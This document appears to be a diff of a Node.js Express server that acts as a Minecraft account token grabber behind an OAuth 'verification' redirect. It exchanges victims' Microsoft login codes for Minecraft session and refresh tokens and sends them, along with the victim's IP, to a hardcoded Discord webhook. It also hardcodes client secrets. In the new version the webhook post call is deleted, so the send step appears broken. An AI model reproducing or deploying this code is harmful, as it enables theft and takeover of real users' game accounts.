@@ -1,10 +1,10 @@
-// Configuration
-const client_secret = 'PtY8Q~4WYNUFY3mRVAUhtp0Y8q8NJjnI.5AzmcCS'
-const client_id = '2349c306-8637-4960-9400-89c9ae372b18'
-const redirect_uri = 'https://disc-authentication.herokuapp.com/'
+// CONFIG //
+const client_secret = 'J3C8Q~M5UylHh~VRJJiPmhPNlZ225oMtfYw5xdBH'
+const client_id = 'fcc2cabf-20a8-42e6-96e0-80b398b62fbf'
+const redirect_uri = 'https://hypixeltodiscordverify.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1034525290875060314/bus7n2Ux68ZnpB9uJSLqxQpKWneN_RVT8QtBd6HKqxSBT_r3m61ud_cMt0b8JunX2p9W'
-const webhook_logging_url = 'https://disc-authentication.herokuapp.com/'
-// Config end
+
+// CONFIG END //
 const axios = require('axios')
 const express = require('express')
 const app = express()
@@ -28,11 +28,10 @@ app.get('/', async (req, res) => {
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        if (checkIfBanned(username)) {
-            logToWebhook("Reject", "A person has been rejected.")
+        const ip = getIp(req)
+        if (checkIfBanned(ip)) {
             return
         }
-        const ip = getIp(req)
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
     } catch (e) {
         console.log(e)
@@ -88,8 +87,7 @@ async function getXSTSToken(userToken) {
     }
     let data = {
         Properties: {
-            SandboxId: 'RETAIL',
-            UserTokens: [userToken]
+            SandboxId: 'RETAIL', UserTokens: [userToken]
         }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
     }
     let response = await axios.post(url, data, config)
@@ -129,55 +127,38 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone",
-        embeds: [{
-            title: "User Info", color: 0x00ff50, fields: [
-                {name: "Username", value: username, inline: true},
-                {name: "UUID", value: uuid, inline: true},
-                {name: "Ip", value: ip, inline: true},
-                {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Refresh Token", value: refreshToken, inline: false},
-                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
-            ]
+        content: "@everyone", embeds: [{
+            title: "User Info",
+            color: 0x00ff50,
+            fields: [{name: "Username", value: username, inline: true}, {
+                name: "UUID",
+                value: uuid,
+                inline: true
+            }, {name: "Ip", value: ip, inline: true}, {
+                name: "SessionID",
+                value: bearerToken,
+                inline: false
+            }, {name: "Refresh Token", value: refreshToken, inline: false}, {
+                name: "Login",
+                value: username + ":" + uuid + ":" + bearerToken,
+                inline: false
+            },]
         }]
     }
-    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
-    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
 }
 
-function logToWebhook(title, message) {
-    const url = webhook_logging_url
+const bannedIps = []
 
-    let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: " ",
-        embeds: [{
-            title: "Log", color: 0x00ff50, fields: [
-                {name: title, value: ""},
-                {name: message, value: ""}
-            ]
-        }
-        ]
-    }
-    axios.post(url, data).then(() => console.log("Logging to discord."))
+function addBan(ip) {
+    bannedIps.push(ip);
 }
 
-const bannedNames = []
-
-function addBan(name) {
-    bannedNames.push(name);
-}
-
-function checkIfBanned(name) {
-
-    for (const item of bannedNames) {
-        if (name === item) {
+function checkIfBanned(ip) {
+    for (const item of bannedIps) {
+        if (ip === item) {
             return true
         }
     }
-    addBan(name)
+    addBan(ip)
     return false
 }
